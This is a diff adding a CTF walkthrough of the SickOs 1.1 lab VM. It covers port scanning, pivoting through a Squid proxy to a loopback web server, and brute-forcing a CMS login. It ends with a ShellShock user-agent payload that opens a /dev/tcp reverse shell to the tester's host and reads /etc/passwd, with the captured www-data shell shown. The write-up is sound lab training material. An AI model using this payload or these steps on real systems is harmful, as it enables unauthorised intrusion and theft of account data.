@@ -1,0 +1,103 @@
+*SickOs*narrative
+    This CTF gives a clear analogy how hacking strategies can be performed on a network to compromise it in a safe environment. This vm is very similar to labs I faced in OSCP. The objective being to compromise the network/machine and gain Administrative/root privileges on them. https://www.vulnhub.com/entry/sickos-11,132/
+
+
+Level 1.1
+    First we do a port scan to find services:
+    *root@kali:/tmp# nmap -sV -A 192.168.252.133
+
+PORT     STATE  SERVICE    VERSION
+22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
+3128/tcp open   http-proxy Squid http proxy 3.1.19
+|_http-server-header: squid/3.1.19
+|_http-title: ERROR: The requested URL could not be retrieved
+8080/tcp closed http-proxy
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.8*
+
+    The most appealing service in the web proxy running on 3128. We use netcat to connect to it:
+
+    *root@kali:/tmp# nc -vvv 192.168.252.133 3128
+192.168.252.133: inverse host lookup failed: Unknown host
+(UNKNOWN) [192.168.252.133] 3128 (?) open
+GET / HTTP/1.1
+Host: 192.168.252.133
+Connection:close
+
+HTTP/1.0 400 Bad Request
+Server: squid/3.1.19
+...
+<p>The following error was encountered while trying to retrieve the URL: <a href="/">/</a></p>
+
+<blockquote id="error">
+<p><b>Invalid URL</b></p>
+...*
+
+    We can see it is running a Proxy sever, so we try requesting a random URL, such as loopback port 80:
+
+    *root@kali:/tmp# nc -vvv 192.168.252.133 3128
+192.168.252.133: inverse host lookup failed: Unknown host
+(UNKNOWN) [192.168.252.133] 3128 (?) open
+GET http://127.0.0.1 HTTP/1.1
+Host 192.168.252.133
+Connection: Close
+
+HTTP/1.0 200 OK
+Date: Wed, 20 Sep 2017 20:02:29 GMT
+Server: Apache/2.2.22 (Ubuntu)
+X-Powered-By: PHP/5.3.10-1ubuntu3.21
+Vary: Accept-Encoding
+Content-Length: 21
+Content-Type: text/html
+X-Cache: MISS from localhost
+X-Cache-Lookup: MISS from localhost:3128
+Via: 1.0 localhost (squid/3.1.19)
+Connection: keep-alive
+
+<h1>
+BLEHHH!!!
+</h1>*
+
+    So the machine is running an HTTP server on port 80. I script a connection to every port to see if it is running other service but find nothing interesting.
+
+    We can configure Burp to use 192.168.252.133:3128 as Upstream Proxy and browse http://127.0.0.1. I also run a directory discovery scan with Dist.
+
+    It finds robots.txt, which contains a dissallow for */wolfcms*. Opening that in the browser shows a CMS with a couple of posts. There is also a login page at http://127.0.0.1/wolfcms/?/admin/login and in the posts it shows it has been posted by Administrator, so I run a brute force attack against the login.
+
+    It turns out the system blocks you after 3 attempts. I look on the internet and find a RCE vulnerability due to unrestricted file uploads. The exploit URL is
+
+    *http://127.0.0.1/wolfcms/?/admin/plugin/file_manager/browse/*
+
+    But the service requires user authentication.
+
+    Some other interesting files are http://127.0.0.1/connect
+
+    *#!/usr/bin/python
+
+print "I Try to connect things very frequently\n"
+print "You may want to try my services"*
+
+    The directory bruteforce also discovers the following URLs:
+
+    *http://127.0.0.1/server-status/
+http://127.0.0.1//cgi-bin/status*
+
+    The most interesting one is */cgi-bin/status* which is known for applications vulnerable to ShellShock. In the end I manage to get a reverse shell with the following payload:
+
+    *GET http://127.0.0.1/cgi-bin/status HTTP/1.1
+Host: 1127.0.0.1
+user-agent: () { :; }; /bin/bash -c '/bin/bash -i > /dev/tcp/192.168.252.130/31337 0<&1 2>&1; id; cat /etc/passwd';
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Length: 0
+
+root@kali:/# nc -lvp 31337
+listening on [any] 31337 ...
+connect to [192.168.252.130] from (UNKNOWN) [192.168.252.133] 46700
+bash: no job control in this shell
+www-data@SickOs:/usr/lib/cgi-bin$ id
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)*
+
+
